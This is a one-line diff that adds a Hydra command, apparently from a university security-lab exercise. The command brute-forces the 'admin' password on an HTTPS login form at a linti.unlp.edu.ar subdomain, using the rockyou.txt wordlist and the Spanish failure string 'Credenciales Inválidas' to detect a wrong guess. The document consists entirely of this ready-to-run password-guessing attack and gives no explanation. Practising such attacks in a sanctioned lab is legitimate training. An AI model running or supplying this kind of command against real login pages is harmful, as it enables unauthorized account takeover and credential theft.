@@ -1,0 +1,2 @@
+hydra -l admin -P rockyou.txt bueno_tranqui.dsa.linti.unlp.edu.ar https-post-form "/login:username=^USER^&password=^PASS^:Credenciales Inválidas :c" -t 4 -V -f
+
